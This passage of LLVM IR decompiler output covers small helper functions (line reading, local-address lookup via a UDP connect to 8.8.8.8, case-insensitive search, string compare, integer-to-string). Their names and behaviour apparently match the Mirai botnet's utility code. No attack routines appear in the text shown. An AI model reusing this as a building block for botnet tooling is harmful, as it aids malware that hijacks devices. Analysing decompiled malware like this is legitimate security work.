dec_label_pc_10acc:                               ; preds = %dec_label_pc_109dc
  %v1_10acc = inttoptr i32 %v5_109c0 to i8*
  %v2_10acc = load i8, i8* %v1_10acc, align 1
  %v5_10acc = add i32 %v0_109c0, 2
  br label %dec_label_pc_109f4

dec_label_pc_10adc:                               ; preds = %dec_label_pc_10ab0
  br i1 %v2_10adc, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_10adc
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_10adc
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_10adc, { 1, 0 }
  uselistorder i32 %v2_10a88, { 1, 0 }
  uselistorder i32 %v2_10a60, { 1, 0 }
  uselistorder i32 %v3_10a98, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_10a38, { 1, 2, 0 }
  uselistorder i1 %v2_10a38, { 1, 0, 2 }
  uselistorder i32 %v1_10a1c, { 1, 2, 0 }
  uselistorder i32 %v1_10a5c, { 1, 0, 2 }
  uselistorder i32 %v1_10a74, { 1, 0 }
  uselistorder i32 %v1_10a9c, { 2, 3, 1, 0 }
  uselistorder i1 %v9_10a68, { 1, 0, 2 }
  uselistorder i1 %v3_10a68, { 1, 0 }
  uselistorder i32 %v2_10a98.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_109fc, { 1, 0, 2 }
  uselistorder i32 %v2_109fc, { 1, 0 }
  uselistorder i32 %v5_109c0, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_109c0, { 0, 1, 3, 2 }
  uselistorder i32 25, { 22, 23, 6, 16, 5, 12, 2, 13, 3, 14, 4, 15, 11, 7, 17, 0, 18, 8, 9, 19, 10, 20, 1, 21 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 0, 1, 13, 2, 3, 4, 5, 6, 7 }
  uselistorder i8 9, { 2, 0, 1 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_10a60, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_10a1c, { 1, 0 }
  uselistorder label %dec_label_pc_109f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_109c0, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10aec = load i32, i32* @r4, align 4
  store i32 %v3_10aec, i32* %stack_var_-24, align 4
  %v6_10aec = load i32, i32* @r5, align 4
  %v9_10aec = load i32, i32* @r6, align 4
  %v12_10aec = load i32, i32* @r7, align 4
  %v15_10aec = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_10b04

dec_label_pc_10b04:                               ; preds = %dec_label_pc_10b28.dec_label_pc_10b04_crit_edge, %entry
  %v0_10b08 = phi i32 [ %v0_10b08.pre, %dec_label_pc_10b28.dec_label_pc_10b04_crit_edge ], [ %arg3, %entry ]
  %v0_10b04 = phi i32 [ %v5_10b28, %dec_label_pc_10b28.dec_label_pc_10b04_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_10b04, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_10b10 = call i32 @__libc_read(i32 %v0_10b08)
  %v7_10b14 = icmp eq i32 %v1_10b10, 1
  %v0_10b1c = load i32, i32* @r5, align 4
  br i1 %v7_10b14, label %dec_label_pc_10b1c, label %dec_label_pc_10b34

dec_label_pc_10b1c:                               ; preds = %dec_label_pc_10b04
  %v1_10b1c = add i32 %v0_10b1c, 1
  store i32 %v1_10b1c, i32* @r5, align 4
  %v1_10b20 = load i32, i32* @r8, align 4
  %v6_10b24 = icmp slt i32 %v1_10b1c, %v1_10b20
  br i1 %v6_10b24, label %dec_label_pc_10b28, label %.loopexit

dec_label_pc_10b28:                               ; preds = %dec_label_pc_10b1c
  %v0_10b28 = load i32, i32* @r4, align 4
  %v1_10b28 = inttoptr i32 %v0_10b28 to i8*
  %v2_10b28 = load i8, i8* %v1_10b28, align 1
  %v3_10b28 = zext i8 %v2_10b28 to i32
  store i32 %v3_10b28, i32* @r3, align 4
  %v5_10b28 = add i32 %v0_10b28, 1
  store i32 %v5_10b28, i32* @r4, align 4
  %v7_10b2c = icmp eq i8 %v2_10b28, 10
  br i1 %v7_10b2c, label %dec_label_pc_10b34, label %dec_label_pc_10b28.dec_label_pc_10b04_crit_edge

dec_label_pc_10b28.dec_label_pc_10b04_crit_edge:  ; preds = %dec_label_pc_10b28
  %v0_10b08.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10b04

dec_label_pc_10b34:                               ; preds = %dec_label_pc_10b04, %dec_label_pc_10b28
  %v0_10b34 = phi i32 [ %v1_10b1c, %dec_label_pc_10b28 ], [ %v0_10b1c, %dec_label_pc_10b04 ]
  %v2_10b34 = icmp eq i32 %v0_10b34, 0
  br i1 %v2_10b34, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_10b34
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_10b1c, %dec_label_pc_10b34, %bb
  %v0_10b3c = load i32, i32* @r7, align 4
  %v2_10b40 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10b40, i32* @r4, align 4
  store i32 %v6_10aec, i32* @r5, align 4
  store i32 %v9_10aec, i32* @r6, align 4
  store i32 %v12_10aec, i32* @r7, align 4
  store i32 %v15_10aec, i32* @r8, align 4
  ret i32 %v0_10b3c

; uselistorder directives
  uselistorder i32 %v5_10b28, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10b34, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10b48 = load i32, i32* @r4, align 4
  %v6_10b48 = load i32, i32* @r5, align 4
  %v9_10b48 = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_10b58 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10b60 = inttoptr i32 %v0_10b58 to i32*
  store i32 0, i32* %v2_10b60, align 4
  %v0_10b6c = load i32, i32* %r4.global-to-local, align 4
  %v3_10b70 = call i32 @socket(i32 2, i32 2, i32 %v0_10b6c)
  %v7_10b74 = icmp eq i32 %v3_10b70, -1
  store i32 %v3_10b70, i32* @r5, align 4
  br i1 %v7_10b74, label %bb, label %dec_label_pc_10b84

bb:                                               ; preds = %entry
  %v1_10b7c = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10bd0

dec_label_pc_10b84:                               ; preds = %entry
  %v2_10b90 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10b90, i32* @r4, align 4
  %v0_10b9c = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_10bb0 = call i32 @__libc_connect(i32 %v3_10b70, i32 %v2_10b90, i32 %v0_10b9c)
  store i32 %v2_10b90, i32* @r1, align 4
  %v2_10bb8 = ptrtoint i32* %stack_var_-20 to i32
  %v0_10bbc = load i32, i32* @r5, align 4
  %v3_10bc0 = call i32 @__GI_getsockname(i32 %v0_10bbc, i32 %v2_10b90, i32 %v2_10bb8)
  %v0_10bc4 = load i32, i32* @r5, align 4
  %v1_10bc8 = call i32 @__GI___libc_close(i32 %v0_10bc4)
  br label %dec_label_pc_10bd0

dec_label_pc_10bd0:                               ; preds = %bb, %dec_label_pc_10b84
  %storemerge = phi i32 [ 134744072, %dec_label_pc_10b84 ], [ %v1_10b7c, %bb ]
  store i32 %v3_10b48, i32* @r4, align 4
  store i32 %v6_10b48, i32* @r5, align 4
  store i32 %v9_10b48, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10b90, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10b70, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 7, 9, 2, 8, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 25, 27, 24, 4, 26, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 3, 2, 1 }
  uselistorder i32 ()* @__GI___errno_location, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10bd0, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_10be0 = load i8, i8* %tmp, align 1
  %v4_10be0 = zext i8 %v3_10be0 to i32
  store i32 %v4_10be0, i32* @r3, align 4
  %v2_10be4 = icmp eq i8 %v3_10be0, 0
  br i1 %v2_10be4, label %bb, label %dec_label_pc_10bf8

bb:                                               ; preds = %entry
  br label %dec_label_pc_10c0c

dec_label_pc_10bf8:                               ; preds = %entry
  br label %dec_label_pc_10bfc

dec_label_pc_10bfc:                               ; preds = %dec_label_pc_10bfc, %dec_label_pc_10bf8
  %v0_10bfc = phi i32 [ %v1_10bfc, %dec_label_pc_10bfc ], [ 0, %dec_label_pc_10bf8 ]
  %v1_10bfc = add i32 %v0_10bfc, 1
  %v2_10c00 = add i32 %v1_10bfc, %arg2
  %v3_10c00 = inttoptr i32 %v2_10c00 to i8*
  %v4_10c00 = load i8, i8* %v3_10c00, align 1
  %v6_10c00 = zext i8 %v4_10c00 to i32
  store i32 %v6_10c00, i32* @r3, align 4
  %v2_10c04 = icmp eq i8 %v4_10c00, 0
  br i1 %v2_10c04, label %dec_label_pc_10c0c, label %dec_label_pc_10bfc

dec_label_pc_10c0c:                               ; preds = %dec_label_pc_10bfc, %bb
  %v0_10c5021 = phi i32 [ %v4_10be0, %bb ], [ %v1_10bfc, %dec_label_pc_10bfc ]
  %v0_10c142 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_10c142, 1
  br i1 %tmp29, label %dec_label_pc_10c64, label %dec_label_pc_10c20

dec_label_pc_10c20:                               ; preds = %dec_label_pc_10c0c, %dec_label_pc_10c14.backedge
  %v0_10c18.in = phi i32 [ %v0_10c18, %dec_label_pc_10c14.backedge ], [ %v0_10c142, %dec_label_pc_10c0c ]
  %v1_10c2c = phi i32 [ %v1_10c2c15, %dec_label_pc_10c14.backedge ], [ 0, %dec_label_pc_10c0c ]
  %v0_10c20 = phi i32 [ %v5_10c20, %dec_label_pc_10c14.backedge ], [ %tmp23, %dec_label_pc_10c0c ]
  %v0_10c18 = add i32 %v0_10c18.in, -1
  %v1_10c20 = inttoptr i32 %v0_10c20 to i8*
  %v2_10c20 = load i8, i8* %v1_10c20, align 1
  %v3_10c20 = zext i8 %v2_10c20 to i32
  %v5_10c20 = add i32 %v0_10c20, 1
  %v1_10c24 = add nsw i32 %v3_10c20, -65
  %v2_10c2c = add i32 %v1_10c2c, %arg2
  %v3_10c2c = inttoptr i32 %v2_10c2c to i8*
  %v4_10c2c = load i8, i8* %v3_10c2c, align 1
  %v6_10c2c = zext i8 %v4_10c2c to i32
  store i32 %v6_10c2c, i32* @r3, align 4
  %v1_10c30 = add nsw i32 %v6_10c2c, -65
  %tmp38 = icmp ult i32 %v1_10c24, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_10c20
  %v5_10c34 = or i32 %v3_10c20, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_10c20, %bb30
  %v0_10c40 = phi i32 [ %v3_10c20, %dec_label_pc_10c20 ], [ %v5_10c34, %bb30 ]
  %tmp39 = icmp ult i32 %v1_10c30, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_10c3c = or i32 %v6_10c2c, 96
  store i32 %v5_10c3c, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_10c40 = phi i32 [ %v6_10c2c, %bb31 ], [ %v5_10c3c, %bb32 ]
  %v9_10c40 = icmp eq i32 %v0_10c40, %v1_10c40
  br i1 %v9_10c40, label %dec_label_pc_10c4c, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_10c14.backedge

dec_label_pc_10c14.backedge:                      ; preds = %bb34, %dec_label_pc_10c4c
  %v1_10c2c15 = phi i32 [ 0, %bb34 ], [ %v1_10c4c, %dec_label_pc_10c4c ]
  %tmp35 = icmp slt i32 %v0_10c18, 1
  br i1 %tmp35, label %dec_label_pc_10c64, label %dec_label_pc_10c20

dec_label_pc_10c4c:                               ; preds = %bb33
  %v1_10c4c = add i32 %v1_10c2c, 1
  %v9_10c50 = icmp eq i32 %v0_10c5021, %v1_10c4c
  br i1 %v9_10c50, label %dec_label_pc_10c58, label %dec_label_pc_10c14.backedge

dec_label_pc_10c58:                               ; preds = %dec_label_pc_10c4c
  %v2_10c58 = sub i32 %v5_10c20, %tmp23
  br label %dec_label_pc_10c64

dec_label_pc_10c64:                               ; preds = %dec_label_pc_10c14.backedge, %dec_label_pc_10c0c, %dec_label_pc_10c58
  %storemerge = phi i32 [ %v2_10c58, %dec_label_pc_10c58 ], [ -1, %dec_label_pc_10c0c ], [ -1, %dec_label_pc_10c14.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10c4c, { 1, 0 }
  uselistorder i32 %v0_10c20, { 1, 0 }
  uselistorder i32 %v1_10c2c, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 7, 6, 8, 3, 9, 4, 10, 5, 11, 12 }
  uselistorder label %dec_label_pc_10c64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c14.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_10c20, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_10c6c = load i8, i8* %arg1, align 1
  %v2_10c70 = icmp eq i8 %v2_10c6c, 0
  br i1 %v2_10c70, label %bb, label %dec_label_pc_10c7c

bb:                                               ; preds = %entry
  %v3_10c6c = zext i8 %v2_10c6c to i32
  br label %dec_label_pc_10c90

dec_label_pc_10c7c:                               ; preds = %entry
  br label %dec_label_pc_10c80

dec_label_pc_10c80:                               ; preds = %dec_label_pc_10c80, %dec_label_pc_10c7c
  %v0_10c80 = phi i32 [ %v1_10c80, %dec_label_pc_10c80 ], [ 0, %dec_label_pc_10c7c ]
  %v1_10c80 = add i32 %v0_10c80, 1
  %v2_10c84 = add i32 %v1_10c80, %tmp
  %v3_10c84 = inttoptr i32 %v2_10c84 to i8*
  %v4_10c84 = load i8, i8* %v3_10c84, align 1
  %v2_10c88 = icmp eq i8 %v4_10c84, 0
  br i1 %v2_10c88, label %dec_label_pc_10c90, label %dec_label_pc_10c80

dec_label_pc_10c90:                               ; preds = %dec_label_pc_10c80, %bb
  %v0_10cdc3 = phi i32 [ %v3_10c6c, %bb ], [ %v1_10c80, %dec_label_pc_10c80 ]
  %v1_10c90 = inttoptr i32 %arg2 to i8*
  %v2_10c90 = load i8, i8* %v1_10c90, align 1
  %v3_10c90 = zext i8 %v2_10c90 to i32
  store i32 %v3_10c90, i32* @r3, align 4
  %v2_10c94 = icmp eq i8 %v2_10c90, 0
  br i1 %v2_10c94, label %bb21, label %dec_label_pc_10ca0

bb21:                                             ; preds = %dec_label_pc_10c90
  store i32 %v3_10c90, i32* @r2, align 4
  br label %dec_label_pc_10cb4

dec_label_pc_10ca0:                               ; preds = %dec_label_pc_10c90
  br label %dec_label_pc_10ca4

dec_label_pc_10ca4:                               ; preds = %dec_label_pc_10ca4, %dec_label_pc_10ca0
  %v0_10ca4 = phi i32 [ %v1_10ca4, %dec_label_pc_10ca4 ], [ 0, %dec_label_pc_10ca0 ]
  %v1_10ca4 = add i32 %v0_10ca4, 1
  store i32 %v1_10ca4, i32* @r2, align 4
  %v2_10ca8 = add i32 %v1_10ca4, %arg2
  %v3_10ca8 = inttoptr i32 %v2_10ca8 to i8*
  %v4_10ca8 = load i8, i8* %v3_10ca8, align 1
  %v6_10ca8 = zext i8 %v4_10ca8 to i32
  store i32 %v6_10ca8, i32* @r3, align 4
  %v2_10cac = icmp eq i8 %v4_10ca8, 0
  br i1 %v2_10cac, label %dec_label_pc_10cb4, label %dec_label_pc_10ca4

dec_label_pc_10cb4:                               ; preds = %dec_label_pc_10ca4, %bb21
  %v0_10cb4 = phi i32 [ %v3_10c90, %bb21 ], [ %v1_10ca4, %dec_label_pc_10ca4 ]
  %v9_10cb4 = icmp eq i32 %v0_10cb4, %v0_10cdc3
  br i1 %v9_10cb4, label %dec_label_pc_10cdc.preheader, label %dec_label_pc_10cbc

dec_label_pc_10cdc.preheader:                     ; preds = %dec_label_pc_10cb4
  %v2_10cdc5 = icmp eq i32 %v0_10cdc3, 0
  br i1 %v2_10cdc5, label %dec_label_pc_10ce4, label %dec_label_pc_10cc4

dec_label_pc_10cbc:                               ; preds = %dec_label_pc_10cc4, %dec_label_pc_10cb4
  ret i32 0

dec_label_pc_10cc4:                               ; preds = %dec_label_pc_10cd4, %dec_label_pc_10cdc.preheader
  %v0_10cdc.in = phi i32 [ %v0_10cdc, %dec_label_pc_10cd4 ], [ %v0_10cdc3, %dec_label_pc_10cdc.preheader ]
  %v0_10cd8 = phi i32 [ %v1_10cd8, %dec_label_pc_10cd4 ], [ %arg2, %dec_label_pc_10cdc.preheader ]
  %v0_10cd4 = phi i32 [ %v1_10cd4, %dec_label_pc_10cd4 ], [ %tmp, %dec_label_pc_10cdc.preheader ]
  %v0_10cdc = add i32 %v0_10cdc.in, -1
  %v1_10cc4 = inttoptr i32 %v0_10cd4 to i8*
  %v2_10cc4 = load i8, i8* %v1_10cc4, align 1
  %v3_10cc4 = zext i8 %v2_10cc4 to i32
  store i32 %v3_10cc4, i32* @r2, align 4
  %v1_10cc8 = inttoptr i32 %v0_10cd8 to i8*
  %v2_10cc8 = load i8, i8* %v1_10cc8, align 1
  %v3_10cc8 = zext i8 %v2_10cc8 to i32
  store i32 %v3_10cc8, i32* @r3, align 4
  %v9_10ccc = icmp eq i8 %v2_10cc4, %v2_10cc8
  br i1 %v9_10ccc, label %dec_label_pc_10cd4, label %dec_label_pc_10cbc

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_10cc4
  %v1_10cd4 = add i32 %v0_10cd4, 1
  %v1_10cd8 = add i32 %v0_10cd8, 1
  %v2_10cdc = icmp eq i32 %v0_10cdc, 0
  br i1 %v2_10cdc, label %dec_label_pc_10ce4, label %dec_label_pc_10cc4

dec_label_pc_10ce4:                               ; preds = %dec_label_pc_10cd4, %dec_label_pc_10cdc.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_10ca4, { 0, 1, 3, 2 }
  uselistorder i8 %v2_10c6c, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_10cf0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10cf0, i32* %r8.global-to-local, align 4
  %v2_10cf0 = icmp eq i32 %v0_10cf0, 0
  store i1 %v2_10cf0, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_10cf0, label %dec_label_pc_10dd0, label %dec_label_pc_10d00

dec_label_pc_10d00:                               ; preds = %entry
  %v3_10d00 = icmp eq i8 %arg1, 0
  store i1 %v3_10d00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10d00, label %.thread, label %dec_label_pc_10d14

.thread:                                          ; preds = %dec_label_pc_10d00
  %v4_10d08 = inttoptr i32 %v0_10cf0 to i8*
  store i8 48, i8* %v4_10d08, align 1
  %v0_10d0c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10d0c.pr.pr, label %.thread1, label %dec_label_pc_10d14

.thread1:                                         ; preds = %.thread
  %v4_10d0c = load i32, i32* %r8.global-to-local, align 4
  %v5_10d0c = add i32 %v4_10d0c, 1
  %v6_10d0c = inttoptr i32 %v5_10d0c to i8*
  store i8 0, i8* %v6_10d0c, align 1
  %v0_10d10.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10d10.pr.pr, label %dec_label_pc_10dd0, label %dec_label_pc_10d14

dec_label_pc_10d14:                               ; preds = %dec_label_pc_10d00, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_10d18 = icmp eq i32 %arg2, 10
  store i1 %v7_10d18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d18, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_10d14
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_10d14
  %v4_10d14 = zext i1 %tmp48 to i32
  store i32 %v4_10d14, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_10d388 = sub nsw i32 0, %tmp
  %tmp.v3_10d388 = select i1 %phitmp, i32 %tmp, i32 %v3_10d388
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_10d388, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_10d44 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_10d44, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10d48

dec_label_pc_10d48:                               ; preds = %bb46, %.thread6
  %v2_10d68 = phi i32 [ %v1_10d74, %bb46 ], [ 32, %.thread6 ]
  %v0_10d5c = phi i32 [ %v2_10d6c, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_10d4c = load i32, i32* %r6.global-to-local, align 4
  %v3_10d50 = urem i32 %v0_10d5c, %v0_10d4c
  store i32 %v3_10d50, i32* %r1.global-to-local, align 4
  %v7_10d54 = icmp eq i32 %v3_10d50, 9
  store i1 %v7_10d54, i1* %cpsr_z.global-to-local, align 1
  %v1_10d58 = add i32 %v3_10d50, 48
  store i32 %v0_10d5c, i32* %r0.global-to-local, align 4
  %v7_10d60 = icmp sgt i32 %v3_10d50, 9
  %extract.t = trunc i32 %v1_10d58 to i8
  br i1 %v7_10d60, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_10d48
  %v9_10d60 = add i32 %v3_10d50, 55
  %extract.t28 = trunc i32 %v9_10d60 to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_10d48, %bb45
  %v0_10d68.off0 = phi i8 [ %extract.t, %dec_label_pc_10d48 ], [ %extract.t28, %bb45 ]
  store i32 %v0_10d4c, i32* %r1.global-to-local, align 4
  %v3_10d68 = load i32, i32* %r7.global-to-local, align 4
  %v4_10d68 = add i32 %v3_10d68, %v2_10d68
  %v5_10d68 = inttoptr i32 %v4_10d68 to i8*
  store i8 %v0_10d68.off0, i8* %v5_10d68, align 1
  %v0_10d6c = load i32, i32* %r0.global-to-local, align 4
  %v1_10d6c = load i32, i32* %r1.global-to-local, align 4
  %v2_10d6c = udiv i32 %v0_10d6c, %v1_10d6c
  store i32 %v2_10d6c, i32* %r0.global-to-local, align 4
  %v2_10d70 = icmp ugt i32 %v1_10d6c, %v0_10d6c
  store i1 %v2_10d70, i1* %cpsr_z.global-to-local, align 1
  %v0_10d74 = load i32, i32* %r5.global-to-local, align 4
  %v1_10d74 = add i32 %v0_10d74, -1
  store i32 %v1_10d74, i32* %r5.global-to-local, align 4
  br i1 %v2_10d70, label %dec_label_pc_10d7c, label %dec_label_pc_10d48

dec_label_pc_10d7c:                               ; preds = %bb46
  %v0_10d7c = load i32, i32* %sl.global-to-local, align 4
  %v2_10d7c = icmp eq i32 %v0_10d7c, 0
  store i1 %v2_10d7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10d7c, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_10d7c
  %v3_10d80 = ptrtoint i32* %stack_var_-32 to i32
  %v3_10d84 = add i32 %v1_10d74, %v3_10d80
  store i32 %v3_10d84, i32* %r2.global-to-local, align 4
  %v4_10d8c = add i32 %v3_10d84, -34
  %v5_10d8c = inttoptr i32 %v4_10d8c to i8*
  store i8 45, i8* %v5_10d8c, align 1
  %v0_10d90.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10d90.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_10d90.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_10d7c
  %v1_10d90 = phi i32 [ %v1_10d74, %dec_label_pc_10d7c ], [ %v1_10d90.pre, %.thread11 ]
  %v2_10d90 = add i32 %v1_10d90, 1
  store i32 %v2_10d90, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_10d9c = phi i32 [ %v2_10d90, %.thread12 ], [ %v1_10d90.pre, %.thread11 ]
  %v0_10d94 = load i32, i32* %r7.global-to-local, align 4
  %v2_10d94 = add i32 %v0_10d94, %v1_10d9c
  %v3_10d94 = inttoptr i32 %v2_10d94 to i8*
  %v4_10d94 = load i8, i8* %v3_10d94, align 1
  %v6_10d94 = zext i8 %v4_10d94 to i32
  %v2_10d98 = icmp eq i8 %v4_10d94, 0
  store i1 %v2_10d98, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_10d94, i32* %r2.global-to-local, align 4
  br i1 %v2_10d98, label %dec_label_pc_10de0, label %dec_label_pc_10da8.preheader

dec_label_pc_10da8.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10da8

dec_label_pc_10da8:                               ; preds = %dec_label_pc_10da8.preheader, %dec_label_pc_10da8
  %v0_10da8 = phi i32 [ 0, %dec_label_pc_10da8.preheader ], [ %v1_10da8, %dec_label_pc_10da8 ]
  %v1_10da8 = add i32 %v0_10da8, 1
  store i32 %v1_10da8, i32* %r1.global-to-local, align 4
  %v2_10dac = add i32 %v1_10da8, %v2_10d94
  %v3_10dac = inttoptr i32 %v2_10dac to i8*
  %v4_10dac = load i8, i8* %v3_10dac, align 1
  %v2_10db0 = icmp eq i8 %v4_10dac, 0
  store i1 %v2_10db0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10db0, label %dec_label_pc_10db8, label %dec_label_pc_10da8

dec_label_pc_10db8:                               ; preds = %dec_label_pc_10da8, %dec_label_pc_10de0
  %v0_10dbc25 = phi i32 [ %v6_10d94, %dec_label_pc_10de0 ], [ %v1_10da8, %dec_label_pc_10da8 ]
  %v0_10db8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10db8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10dbc

dec_label_pc_10dbc:                               ; preds = %dec_label_pc_10dbc.dec_label_pc_10dbc_crit_edge, %dec_label_pc_10db8
  %v2_10dc8 = phi i32 [ %v5_10dc8, %dec_label_pc_10dbc.dec_label_pc_10dbc_crit_edge ], [ %v0_10db8, %dec_label_pc_10db8 ]
  %v0_10dc0 = phi i32 [ %v0_10dc0.pre, %dec_label_pc_10dbc.dec_label_pc_10dbc_crit_edge ], [ %v2_10d94, %dec_label_pc_10db8 ]
  %v0_10dbc = phi i32 [ %v0_10dbc.pre, %dec_label_pc_10dbc.dec_label_pc_10dbc_crit_edge ], [ %v0_10dbc25, %dec_label_pc_10db8 ]
  %v1_10dbc = add i32 %v0_10dbc, -1
  store i32 %v1_10dbc, i32* %r1.global-to-local, align 4
  %v1_10dc0 = inttoptr i32 %v0_10dc0 to i8*
  %v2_10dc0 = load i8, i8* %v1_10dc0, align 1
  %v5_10dc0 = add i32 %v0_10dc0, 1
  store i32 %v5_10dc0, i32* %r2.global-to-local, align 4
  %v3_10dc4 = icmp eq i32 %v0_10dbc, 0
  store i1 %v3_10dc4, i1* %cpsr_z.global-to-local, align 1
  %v3_10dc8 = inttoptr i32 %v2_10dc8 to i8*
